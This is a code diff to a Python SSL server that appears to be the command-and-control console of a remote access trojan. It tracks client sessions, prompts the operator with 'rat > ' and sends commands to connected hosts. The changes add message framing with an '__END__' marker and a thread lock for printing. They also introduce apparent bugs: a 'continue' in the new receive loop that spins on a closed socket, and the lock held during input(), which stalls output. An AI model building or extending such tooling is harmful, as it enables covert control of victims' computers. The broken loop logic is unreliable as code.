@@ -5,6 +5,7 @@
 import socket
 import ssl
 from threading import Thread
+from threading import Lock
 from utils.logger import setup_logger
 import json
 from server.sessions import SessionManager
@@ -30,6 +31,7 @@ class SSLServer:
         self.chunk_size = chunk_size
 
         self.sessions = SessionManager()
+        self.print_lock = Lock()
 
         # SSL context
         self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
@@ -42,6 +44,11 @@ class SSLServer:
         )
 
         self._context.load_verify_locations(client_cert)
+
+    def safe_print(self, *args, **kwargs):
+
+        with self.print_lock:
+            print(*args, **kwargs)
 
     def start(self):
 
@@ -95,17 +102,34 @@ class SSLServer:
                         addr[0],
                     )
 
-                    data = sconn.recv(self.chunk_size)
+                    EOM = "__END__"
 
-                    if not data:
+                    buffer = ""
 
-                        logger.warning("Client disconnected before sending info")
+                    while True:
 
-                        sconn.close()
+                        data = sconn.recv(self.chunk_size)
 
-                        continue
+                        if not data:
+                            logger.warning("Client disconnected before sending info")
 
-                    client_info = json.loads(data.decode())
+                            sconn.close()
+
+                            continue
+
+                        buffer += data.decode()
+
+                        if EOM in buffer:
+                            message, buffer = buffer.split(
+                                EOM,
+                                1,
+                            )
+
+                            message = message.strip()
+
+                            client_info = json.loads(message)
+
+                            break
 
                     session_id = self.sessions.add(
                         sconn,
@@ -142,6 +166,10 @@ class SSLServer:
         session_id,
     ):
 
+        EOM = "__END__"
+
+        buffer = ""
+
         try:
 
             while True:
@@ -149,25 +177,36 @@ class SSLServer:
                 data = sock.recv(self.chunk_size)
 
                 if not data:
-
-                    logger.warning(
-                        "Client %s disconnected",
-                        session_id,
-                    )
-
-                    print(f"\n[-] Session " f"{session_id} disconnected")
+                    with self.print_lock:
+                        print(f"\n[-] Session " f"{session_id} disconnected")
 
                     break
 
-                response = data.decode(errors="ignore")
+                buffer += data.decode(errors="ignore")
 
-                print(f"\n[{session_id}] " f"{response}")
+                while EOM in buffer:
 
-                print(
-                    "rat > ",
-                    end="",
-                    flush=True,
-                )
+                    message, buffer = buffer.split(
+                        EOM,
+                        1,
+                    )
+
+                    message = message.strip()
+
+                    if not message:
+                        continue
+
+                    with self.print_lock:
+
+                        print(f"\n[{session_id}]")
+
+                        print(message)
+
+                        print(
+                            "rat > ",
+                            end="",
+                            flush=True,
+                        )
 
         except (
             ConnectionResetError,
@@ -191,7 +230,9 @@ class SSLServer:
 
             try:
 
-                command = input("rat > ").strip()
+                with self.print_lock:
+
+                    command = input("rat > ").strip()
 
                 if not command:
 
@@ -258,7 +299,7 @@ class SSLServer:
 
                 try:
 
-                    sock.sendall(command.encode())
+                    sock.sendall((command + "\n").encode())
 
                     logger.info(
                         "Command sent to %s: %s",
